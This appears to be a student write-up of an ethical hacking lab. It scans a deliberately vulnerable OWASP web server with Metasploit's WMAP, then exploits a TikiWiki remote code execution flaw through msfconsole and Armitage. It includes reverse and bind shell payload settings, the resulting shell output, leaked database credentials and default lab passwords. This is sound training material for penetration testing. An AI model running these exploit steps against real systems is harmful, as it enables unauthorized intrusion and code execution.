# Lab 09: Metasploit Framework Fundamentals and Armitage

> **Course:** Ethical Hacking V2 — NDG Lab Series  
> **Date Completed:** 2025  
> **Environment:** Kali Linux → pfSense → OWASP Broken Web App (NETLAB+)  
> **Certifications Covered:** CEH v10, CompTIA PenTest+

---

## Table of Contents

1. [Lab Overview](#1-lab-overview)
2. [Environment & Network Topology](#2-environment--network-topology)
3. [Task 1 — Getting Familiar with Metasploit](#3-task-1--getting-familiar-with-metasploit)
4. [Task 2 — Vulnerability Scanning with WMAP](#4-task-2--vulnerability-scanning-with-wmap)
5. [Task 3 — Configuring Exploits and Payloads](#5-task-3--configuring-exploits-and-payloads)
6. [Task 4 — Starting Armitage and Scanning Hosts](#6-task-4--starting-armitage-and-scanning-hosts)
7. [Task 5 — Finding and Executing Attacks in Armitage](#7-task-5--finding-and-executing-attacks-in-armitage)
8. [Key Concepts Summary](#8-key-concepts-summary)
9. [Lessons Learned](#9-lessons-learned)

---

## 1. Lab Overview

**Metasploit** is an industry-standard penetration testing framework containing thousands of exploit modules, payloads, auxiliary tools, and post-exploitation utilities. This lab covers the full attack lifecycle — from initial reconnaissance and vulnerability scanning through exploitation and post-exploitation — using both the command-line interface (`msfconsole`) and the graphical front-end (`Armitage`).

### Objectives

| # | Task |
|---|------|
| 1 | Get familiar with Metasploit's core commands and structure |
| 2 | Perform web vulnerability scanning using the WMAP plugin |
| 3 | Configure an exploit module with appropriate payload and options |
| 4 | Launch Armitage and run an Nmap scan from the GUI |
| 5 | Find and execute an attack against a target host via Armitage |

---

## 2. Environment & Network Topology

```
[Kali Linux]  192.168.9.2
      |
   WAN: 192.168.9.0/24
      |
  [pfSense]  192.168.9.1 / 192.168.68.254
      |
   DMZ: 192.168.68.0/24
      |
[OWASP BWA]  192.168.68.12
```

### Credentials

| Virtual Machine     | IP Address(es)                              | Username | Password  |
|---------------------|---------------------------------------------|----------|-----------|
| Kali Linux          | 192.168.9.2 / 192.168.0.2                   | root     | toor      |
| pfSense             | 192.168.0.254 / 192.168.68.254 / 192.168.9.1| admin    | pfsense   |
| OWASP Broken Web App| 192.168.68.12                               | root     | owaspbwa  |

> **Note:** The OWASP Broken Web Applications (BWA) VM is a deliberately vulnerable machine used for practice. Never run these techniques against systems you do not own or have explicit permission to test.

---

## 3. Task 1 — Getting Familiar with Metasploit

### Step-by-Step

**Step 1: Initialize the Metasploit database**

```bash
msfdb init
```

Metasploit relies on a PostgreSQL database to store scan results, session history, discovered hosts, and vulnerability data. Running `msfdb init` creates the database schema for the first time. Without this, reconnaissance data and session logs cannot be persisted.

---

**Step 2: Start the PostgreSQL service**

```bash
service postgresql start
```

This starts the PostgreSQL daemon in the background. Metasploit connects to it at runtime to read/write all collected data. If the database is not running, `msfconsole` will warn of a database connection failure and operate in a degraded state.

---

**Step 3: Launch msfconsole**

```bash
msfconsole
```

`msfconsole` is the primary interactive interface for Metasploit. It loads all available modules into memory and presents an `msf6 >` prompt where every subsequent command is executed. This is the "command center" for all penetration testing activities.

---

**Step 4: Display a random banner**

```
msf6 > banner
```

Metasploit displays a randomly chosen ASCII art banner on startup. The `banner` command regenerates one on demand. This also confirms the framework version and shows the current module counts (exploits, auxiliary, post, payloads, encoders, nops, evasion).

---

**Step 5: View all available commands**

```
msf6 > help
```

Prints the full list of core commands grouped by category (Core Commands, Module Commands, Job Commands, Resource Script Commands, Database Backend Commands, etc.). Essential reading when you forget a command's exact syntax.

---

**Step 6: Run a system command from within msfconsole**

```
msf6 > ifconfig
```

`msfconsole` passes unknown commands to the underlying OS shell. Running `ifconfig` confirms the Kali machine's active network interfaces and IP addresses — critical for configuring `LHOST` (local listener address) later.

**Expected output (relevant section):**
```
eth0: inet 192.168.9.2  netmask 255.255.255.0
```

---

**Step 7: Test connectivity to the target using Netcat**

```
msf6 > connect 192.168.68.12 80
```

The `connect` command acts like Netcat inside msfconsole. Connecting to port 80 on the OWASP server confirms the target is alive and the HTTP service is reachable before attempting any exploit. Press `Ctrl+C` to terminate the connection.

---

**Step 8: List all modules**

```
msf6 > show all
```

Dumps the full list of every available module across all categories: Encoders, Nops, Exploits, Payloads, Auxiliary, Post, and Evasion. The output is very long — useful for broad exploration.

---

**Step 9: List only exploit modules**

```
msf6 > show exploits
```

Filters the `show all` output to display only exploit modules, each with its name, disclosure date, rank (Manual / Low / Average / Normal / Good / Great / Excellent), and a short description.

---

**Step 10: List only payload modules**

```
msf6 > show payloads
```

Shows all available payloads. Payloads define what happens *after* a successful exploit — for example, opening a reverse shell, spawning a Meterpreter session, or executing an arbitrary command.

---

## 4. Task 2 — Vulnerability Scanning with WMAP

WMAP is a web application vulnerability scanner plugin built into Metasploit. It automates tests for common web vulnerabilities (directory traversal, FrontPage login exposure, SVN leakage, HTTP header injection, etc.).

### Step-by-Step

**Step 1: Load the WMAP plugin**

```
msf6 > load wmap
```

Dynamically loads the WMAP plugin into the current msfconsole session and makes its commands available.

---

**Step 2: Review WMAP-specific commands**

```
msf6 > help
```

After loading WMAP, the `help` output gains a new "wmap Commands" section:

| Command        | Description                          |
|----------------|--------------------------------------|
| `wmap_modules` | Manage WMAP scan modules             |
| `wmap_nodes`   | Manage nodes                         |
| `wmap_run`     | Test targets                         |
| `wmap_sites`   | Manage sites                         |
| `wmap_targets` | Manage targets                       |
| `wmap_vulns`   | Display discovered web vulnerabilities |

---

**Step 3: Explore site management options**

```
msf6 > wmap_sites -h
```

Prints the usage help for `wmap_sites`:

```
-h          Display help
-a [url]    Add a site (vhost, url)
-d [ids]    Delete sites
-l          List all available sites
-s [id]     Display site structure
```

---

**Step 4: Register the target site**

```
msf6 > wmap_sites -a http://192.168.68.12
```

Adds the OWASP BWA server to WMAP's internal site database. This tells WMAP which host to associate with subsequent scans. The server responds with `[*] Site created.`

---

**Step 5: Confirm the site was added**

```
msf6 > wmap_sites -l
```

Expected output:

```
[*] Available sites
===================
  Id  Host            Vhost           Port  Proto  # Pages  # Forms
  --  ----            -----           ----  -----  -------  -------
   0  192.168.68.12   192.168.68.12   80    http   0        0
```

---

**Step 6: Set a specific scan target path (Mutillidae)**

```
msf6 > wmap_targets -t http://192.168.68.12/mutillidae/index.php
```

Narrows the scan to the **Mutillidae** application — a deliberately vulnerable PHP web app installed on the OWASP BWA server. Targeting a specific path makes the scan faster and more precise.

---

**Step 7: Confirm the target was set**

```
msf6 > wmap_targets -l
```

Expected output:

```
[*] Defined targets
===================
  Id  Vhost           Host            Port  SSL    Path
  --  -----           ----            ----  ---    ----
   0  192.168.68.12   192.168.68.12   80    false  /mutillidae/index.php
```

---

**Step 8: Review run options**

```
msf6 > wmap_run -h
```

| Flag              | Description                                              |
|-------------------|----------------------------------------------------------|
| `-h`              | Display help                                             |
| `-t`              | Show all enabled modules (dry run / preview)             |
| `-m [regex]`      | Run only modules whose names match the regex             |
| `-p [regex]`      | Test only paths matching the regex                       |
| `-e [/path/file]` | Execute using a profile file (run all enabled modules)   |

---

**Step 9: Preview enabled scan modules**

```
msf6 > wmap_run -t
```

Lists every WMAP module that will run against the target without actually executing them. Useful for verifying the scope before committing to a full scan.

---

**Step 10: Inspect the scan profile**

```
msf6 > cat /root/profile
```

Displays the predefined profile file. It contains a curated list of module names (one per line), for example:

```
http_version
open_proxy
robots_txt
frontpage_login
host_header_injection
...
```

Each line corresponds to a specific WMAP test module that will be executed during the scan.

---

**Step 11: Execute the WMAP scan**

```
msf6 > wmap_run -e /root/profile
```

Launches the scan using only the modules listed in `/root/profile`. Allow **1–2 minutes** for completion. The scanner sends crafted HTTP requests to the target and records any anomalous responses.

---

**Step 12: View discovered vulnerabilities**

```
msf6 > wmap_vulns -l
```

Expected output (example):

```
[*] + [192.168.68.12] (192.168.68.12): scraper /
      scraper Scraper
      GET owaspbwa OWASP Broken Web Applications
[*] + [192.168.68.12] (192.168.68.12): file /.svn/entries
      file SVN Entry Found.
      GET Res code: 403
```

This confirms that the scanner found exposed SVN metadata and directory listing artifacts — both real-world vulnerabilities.

---

## 5. Task 3 — Configuring Exploits and Payloads

**Target vulnerability:** TikiWiki CMS (`tikiwiki_graph_formula_exec`) — a remote PHP code execution vulnerability in TikiWiki versions ≤ 1.9.8. The `tiki-graph_formula.php` script fails to properly sanitize user input passed to the `create_function()` PHP call.

### Step-by-Step

**Step 1: Search for available TikiWiki exploits**

```
msf6 > search tikiwiki
```

Returns all modules related to TikiWiki:

```
  #  Name                                              Disclosure Date  Rank       Check  Description
  -  ----                                              ---------------  ----       -----  -----------
  0  auxiliary/admin/tikiwiki/tikidblib                2006-11-01       normal     No     TikiWiki Information Disclosure
  1  exploit/unix/webapp/php_xmlrpc_eval               2005-06-29       excellent  Yes    PHP XML-RPC ...
  2  exploit/unix/webapp/tikiwiki_graph_formula_exec   ...              excellent  Yes    TikiWiki Remote PHP Code Execution
```

---

**Step 2: Read the module info**

```
msf6 > info exploit/unix/webapp/tikiwiki_graph_formula_exec
```

Displays full metadata: description, references (CVEs, BIDs), required options, target platforms, and reliability ranking. Always run `info` before `use` to understand exactly what a module does.

---

**Step 3: Load the exploit module**

```
msf6 > use exploit/unix/webapp/tikiwiki_graph_formula_exec
```

The prompt changes to:
```
msf6 exploit(unix/webapp/tikiwiki_graph_formula_exec) >
```
All subsequent commands operate in the context of this module.

---

**Step 4: Inspect module options**

```
msf6 exploit(...) > show options
```

| Name    | Required | Default    | Description                           |
|---------|----------|------------|---------------------------------------|
| RHOSTS  | yes      | —          | Target host(s)                        |
| RPORT   | yes      | 80         | Target port (TCP)                     |
| SSL     | no       | false      | Negotiate SSL/TLS                     |
| URI     | yes      | /tikiwiki  | TikiWiki directory path               |
| VHOST   | no       | —          | HTTP virtual host                     |

---

**Step 5: Set the remote target**

```
msf6 exploit(...) > set RHOST 192.168.68.12
```

`RHOST` (Remote Host) tells the exploit module which IP to attack.

---

**Step 6: Select a payload**

```
msf6 exploit(...) > set payload php/reverse_php
```

`php/reverse_php` is a single-stage reverse shell payload written in PHP. When the exploit succeeds, the target server executes PHP code that opens a TCP connection *back* to our listener (reverse connection). This bypasses common firewall rules that block *inbound* connections to the target.

---

**Step 7: Set the local listener address**

```
msf6 exploit(...) > set LHOST eth0
```

`LHOST` (Local Host) specifies which interface on the Kali machine should receive the reverse connection. Setting it to the interface name (`eth0`) allows Metasploit to resolve the IP automatically.

---

**Step 8: Set the listener port**

```
msf6 exploit(...) > set LPORT 5656
```

`LPORT` (Local Port) defines which port on the Kali machine to listen on. Port 5656 was chosen because it is not used by any default system service.

---

**Step 9: Final options review**

```
msf6 exploit(...) > show options
```

Verify the full configuration before firing:

```
Module options:
  RHOSTS  192.168.68.12
  RPORT   80
  URI     /tikiwiki

Payload options (php/reverse_php):
  LHOST   eth0
  LPORT   5656
```

---

**Step 10: Execute the exploit**

```
msf6 exploit(...) > exploit
```

Expected output:

```
[*] Started reverse TCP handler on 192.168.9.2:5656
[*] Attempting to obtain database credentials...
[*] TikiWiki database informations:
    db_tiki  : mysql
    user_tiki: tikiwiki
    pass_tiki: tikiwiki
[*] Attempting to execute our payload...
[*] Command shell session 1 opened (192.168.9.2:5656 → 192.168.9.1:62170)
```

A command shell session is now active. The OWASP server has been exploited and a reverse TCP connection is established.

> **Important:** If you do not interact with the session within 30 seconds, it will timeout. Simply run `exploit` again.

---

**Step 11: Identify the current user and working directory**

```bash
whoami
# Output: www-data

pwd
# Output: /owaspbwa/owaspbwa-svn/var/www/tikiwiki
```

`www-data` is the default Apache web server user on Debian/Ubuntu systems. This confirms that the exploit ran in the context of the web server process — limited privileges, but a valid foothold.

---

**Step 12: Exit and clean up**

```bash
exit           # closes the shell session
msf6 > exit    # exits msfconsole
```

---

## 6. Task 4 — Starting Armitage and Scanning Hosts

**Armitage** is a Java-based graphical user interface (GUI) for Metasploit. It connects to the Metasploit RPC server and presents hosts, sessions, and modules visually, making it easier to manage complex engagements.

### Step-by-Step

**Step 1: Launch Armitage**

```bash
armitage
```

---

**Step 2: Connect to the Metasploit database**

In the **Connect…** dialog:
- Host: `127.0.0.1`
- Port: `55553`
- User: `msf`

Click **Connect**. Armitage will prompt to start the Metasploit RPC server — click **Yes**.

---

**Step 3: Clear the database**

Navigate to **Hosts → Clear Database → Yes**.

This removes the `192.168.68.12` host entry that was added during the previous msfconsole tasks, giving us a clean slate to demonstrate Armitage's own discovery workflow.

---

**Step 4: Run an Nmap Intense Scan**

Navigate to **Hosts → Nmap Scan → Intense Scan**, then enter:

```
192.168.68.12
```

This is equivalent to running:

```bash
nmap -T4 -A -v 192.168.68.12
```

| Flag | Meaning |
|------|---------|
| `-T4` | Aggressive timing (faster scan) |
| `-A`  | Enable OS detection, version detection, script scanning, and traceroute |
| `-v`  | Verbose output |

Allow a few minutes for the scan to complete. Click **OK** when the "Scan Complete!" dialog appears.

---

**Step 5: Label the discovered host**

Right-click the `192.168.68.12` icon → **Host → Set label…** → type `OWASP` → **OK**.

The host icon is now labeled for easier identification in the workspace.

---

## 7. Task 5 — Finding and Executing Attacks in Armitage

### Step-by-Step

**Step 1: Select the target host**

Click the `192.168.68.12 / OWASP` icon. A green selection box appears around it.

---

**Step 2: Initiate attack discovery**

Navigate to **Attacks → Find Attacks**.

Armitage queries the database for all exploit modules that match the services discovered during the Nmap scan. Click **OK** when the message dialog appears.

---

**Step 3: Navigate to the TikiWiki exploit**

In the left module tree, expand:

```
exploit → unix → webapp
```

Double-click **`tikiwiki_graph_formula_exec`** to open the Attack window.

---

**Step 4: Review and launch**

The Attack window auto-populates all options:

| Option  | Value           |
|---------|-----------------|
| LHOST   | 192.168.9.2     |
| LPORT   | 23594 (auto)    |
| RHOSTS  | 192.168.68.12   |
| RPORT   | 80              |

> **Note:** Armitage automatically selects `generic/shell_bind_tcp` as the payload — different from the `php/reverse_php` used manually in Task 3. This demonstrates how Armitage makes its own payload selection based on target fingerprinting.

Click **Launch**.

---

**Step 5: Observe the compromised host**

Once the exploit succeeds:
- A **lightning bolt graphic** appears on the OWASP host icon, indicating an active session.
- The console pane shows `Command shell session 1 opened`.

---

**Step 6: Interact with the shell**

Right-click the host → **Shell 1 → Interact**.

In the Shell 1 console tab:

```bash
$ whoami
www-data
```

The `www-data` result confirms successful code execution under the web server's user account. Full root access would require privilege escalation, which is beyond this lab's scope.

---

## 8. Key Concepts Summary

| Concept | Definition |
|---------|------------|
| **msfconsole** | The primary CLI interface for Metasploit Framework |
| **Exploit** | Code that takes advantage of a specific software vulnerability |
| **Payload** | Code that runs on the target *after* a successful exploit |
| **Reverse Shell** | A connection initiated from the *target* back to the attacker, bypassing firewall rules |
| **Meterpreter** | An advanced in-memory payload that provides a rich post-exploitation API |
| **WMAP** | Metasploit's built-in web application vulnerability scanner plugin |
| **RHOST / LHOST** | Remote host (target IP) / Local host (attacker's IP) |
| **RPORT / LPORT** | Remote port (target service port) / Local port (listener port) |
| **Session** | An active connection between the attacker and a compromised host |
| **www-data** | The default Apache web process user on Debian/Ubuntu — limited OS privileges |
| **Privilege Escalation** | Techniques used to gain higher-privilege access after initial compromise |
| **Armitage** | Java-based GUI front-end for Metasploit |
| **Nmap Intense Scan** | `nmap -T4 -A -v` — aggressive, full-detail host/service discovery |

---

## 9. Lessons Learned

1. **Always initialize the database first.** `msfdb init` and `service postgresql start` must run before `msfconsole` for full functionality.

2. **Use `info` before `use`.** Reading a module's description, required options, and reliability rank prevents wasted time and unexpected failures.

3. **Reverse shells bypass firewalls.** Because outbound traffic from the target is less likely to be blocked, `reverse_tcp`/`reverse_php` payloads succeed where bind shells would fail.

4. **Msfconsole ≠ isolated environment.** Linux shell commands (`ifconfig`, `cat`, etc.) work directly inside msfconsole, making it a powerful all-in-one workspace.

5. **WMAP is fast but not exhaustive.** A profile-driven WMAP scan is good for quick wins (SVN leakage, robots.txt, FrontPage exposure), but deeper testing (SQLi, XSS, auth bypass) requires dedicated tools like SQLMap or Burp Suite.

6. **Session timeouts are normal.** PHP reverse shells have short TTLs. Simply re-run `exploit` if a session dies before you can interact with it.

7. **Armitage vs. msfconsole.** Both achieve the same result. Armitage is faster for initial discovery and visual triage; msfconsole gives precise control and is better for scripted or complex scenarios.

8. **`www-data` access is not game over — it's a foothold.** Real-world attackers would follow up with local privilege escalation exploits, SUID binary abuse, or credential harvesting from config files.

---

*This write-up documents a controlled lab exercise performed in an isolated virtual environment for educational purposes only. All techniques described must only be applied to systems you own or have explicit written authorization to test.*
